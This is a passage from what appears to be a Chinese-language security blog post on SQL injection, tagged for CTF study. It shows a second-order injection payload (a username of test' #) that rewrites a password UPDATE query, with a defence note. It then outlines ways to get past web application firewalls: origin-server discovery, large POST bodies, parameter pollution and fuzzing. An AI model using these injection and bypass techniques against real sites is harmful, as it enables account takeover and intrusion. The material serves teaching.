+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>语句中$username现在是test’ #，则现在的语句为：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='test' #'and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>
+<span class="token comment">#有效语句为：</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> "<span class="token constant">UPDATE</span> users <span class="token constant">SET</span> <span class="token constant">PASSWORD</span><span class="token operator">=</span><span class="token string single-quoted-string">'$pass'</span> where username<span class="token operator">=</span><span class="token string single-quoted-string">'test'</span>
+这里直接就会将test用户的密码进行更改，实现了二次注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>防御：在对sql语句进行过滤以及转义时，除了要小心各个普通的查询和注入点，已经存入数据库的数据在进行取用时也需要进行过滤以及转义，防止二次注入的产生。</li>
+</ul>
+<h3 id="waf的绕过"><a href="#waf的绕过" class="headerlink" title="waf的绕过"></a>waf的绕过</h3><p>对于sql注入来说，在进行真实的渗透测试时，遇见waf才是绝大多数情况。如何绕过waf是我们需要进行掌握和熟练的。</p>
+<p>从大的方面来说，在进行黑盒测试有如下的绕过原理：</p>
+<ol>
+<li>架构层绕过WAF<ol>
+<li>寻找源站→针对云WAF</li>
+<li>利用同网断→绕过WAF防护区域</li>
+<li>利用边界漏洞→绕过WAF防护区域</li>
+</ol>
+</li>
+<li>利用边界漏洞→绕过WAF防护区域<ol>
+<li>POST大BODY协议层面绕过WAF的检测</li>
+</ol>
+</li>
+<li>协议未覆盖绕过waf<ol>
+<li>请求方式变换：GET→POST Content-Typesta：application/x-www-form-urlencoded；multipart/form-data；</li>
+<li>参数污染</li>
+</ol>
+</li>
+<li>规则层面的绕过（主要的绕过方式）（以sql注入为例）</li>
+</ol>
+<p><img src="/images/image-20210804165557793.png"></p>
+<p>在知道原理后该如何进行绕过呢？那就是通过fuzz进行绕过，fuzz，模糊测试，<strong>在这里简单来说就是对于这些可能成功的绕过方法进行自动化或者半自动化的测试</strong>，例如：</p>
+<p><img src="/images/image-20210804165821212.png"></p>
+<p>对于空白字符进行的过滤通过脚本或者burp等工具进行不断的测试，直到绕过，接下来在遇到新的防护规则时又继续fuzz</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">0xahh</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://howahh.github.io.git/2020/09/22/sqlinjection/">https://howahh.github.io.git/2020/09/22/sqlinjection/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">0xahh</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '9go79qnTupRR61jWEfIWVzvy-gzGzoHsz',
+        appKey: 'tVB7E05bcxLCeUKo8fmejn8O',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/10/06/sqlmap-shi-yong/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="sqlmap使用">
+                        
+                        <span class="card-title">sqlmap使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            sqlmap的使用介绍及记录
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-06
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/09/15/ji-chu-ku-de-shi-yong/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="爬虫基础库的使用">
+                        
+                        <span class="card-title">爬虫基础库的使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            爬虫基础库的介绍
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%88%AC%E8%99%AB/" class="post-category">
+                                    爬虫
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/python/">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%88%AC%E8%99%AB/">
+                        <span class="chip bg-color">爬虫</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('3'),
+            headingSelector: 'h1, h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="2614947145"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2020-2024</span>
+            
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">0xahh</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">95.1k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/howahh" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:871759032@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=871759032" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 871759032" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
